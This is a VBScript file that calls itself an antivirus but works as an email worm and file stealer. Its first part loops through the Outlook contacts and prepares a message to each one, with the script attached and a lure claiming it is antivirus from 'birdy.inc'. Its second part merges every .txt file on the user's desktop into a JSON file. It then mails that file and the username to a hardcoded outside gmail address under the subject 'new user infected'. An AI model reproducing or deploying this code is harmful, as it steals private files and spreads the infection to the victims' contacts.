
set x=wscript.createobject ("wscript.shell")


Dim OutlookApp, Namespace, ContactsFolder, ContactItem
Dim MailItem, RecipientEmail, SendCount, Confirm

SendCount = 0

' Create Outlook application object
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If Err.Number <> 0 Then
    WScript.Echo ""
    WScript.Quit
End If
On Error GoTo 0

' Get MAPI namespace and Contacts folder
Set Namespace = OutlookApp.GetNamespace("MAPI")
Set ContactsFolder = Namespace.GetDefaultFolder(10) ' 10 = olFolderContacts


strFilePath = WScript.ScriptFullName

' Loop through contacts
For Each ContactItem In ContactsFolder.Items
    If ContactItem.Class = 40 Then ' 40 = olContact
        RecipientEmail = Trim(ContactItem.Email1Address)
        If RecipientEmail <> "" Then
            ' Create a new email
            Set MailItem = OutlookApp.CreateItem(0) ' 0 = olMailItem
            With MailItem
                .To = RecipientEmail
                .Subject = "Hello i saw this vbs antivirus file"
                .Body = "This is a antivirus made by birdy.inc copyright 2026."
		.Attachments.Add strFilePath

                ' Uncomment the next line to send automatically
                '.Send
                ' For testing, display instead of sending
                .Display
            End With
            SendCount = SendCount + 1
        End If
    End If
Next

WScript.Echo "antivirus"

' Cleanup
Set MailItem = Nothing
Set ContactItem = Nothing
Set ContactsFolder = Nothing
Set Namespace = Nothing
Set OutlookApp = Nothing


Dim shell, username, targetFolder, outputFile
Dim fso, folder, file, ts, outFile
Dim json, firstItem, content

' === Get real username ===
Set shell = CreateObject("WScript.Shell")
username = shell.ExpandEnvironmentStrings("%USERNAME%")

' === Build paths ===
targetFolder = "C:\Users\" & username & "\OneDrive\Desktop"
outputFile   = targetFolder & "\merged_texts.json"

' === Create FileSystemObject ===
Set fso = CreateObject("Scripting.FileSystemObject")

' === Validate folder exists ===
If Not fso.FolderExists(targetFolder) Then
    WScript.Echo "Error: Folder not found - " & targetFolder
    WScript.Quit 1
End If

Set folder = fso.GetFolder(targetFolder)

' === Start JSON object ===
json = "{"
firstItem = True

' === Loop through all .txt files ===
For Each file In folder.Files
    If LCase(fso.GetExtensionName(file.Name)) = "txt" Then
        On Error Resume Next
        Set ts = file.OpenAsTextStream(1, 0) ' ForReading
        If Err.Number <> 0 Then
            WScript.Echo "Error reading file: " & file.Name
            Err.Clear
        Else
            content = ts.ReadAll
            ts.Close
            
            ' Escape JSON special characters
            content = Replace(content, "\", "\\")
            content = Replace(content, """", "\""")
            content = Replace(content, vbCrLf, "\n")
            content = Replace(content, vbCr, "\n")
            content = Replace(content, vbLf, "\n")
            
            ' Add comma if not first item
            If Not firstItem Then
                json = json & ","
            Else
                firstItem = False
            End If
            
            ' Append to JSON
            json = json & """" & file.Name & """:""" & content & """"
        End If
        On Error GoTo 0
    End If
Next

' === Close JSON object ===
json = json & "}"

' === Create and write output file ===
On Error Resume Next
Set outFile = fso.CreateTextFile(outputFile, True) ' True = overwrite if exists
If Err.Number <> 0 Then
    WScript.Echo "Error creating file: " & outputFile
    WScript.Quit 1
End If
outFile.Write json
outFile.Close
On Error GoTo 0

WScript.Echo "JSON file created successfully: " & outputFile
Set objOutlook = CreateObject("Outlook.Application")
Set objMail = objOutlook.CreateItem(0)

' Configurações do e-mail
objMail.To = "banjaminlourencoduarte@gmail.com"
objMail.Subject = "new user infected"
objMail.Body = "hi  im infected and im " & username
objMail.Attachments.Add outputFile
objMail.Display
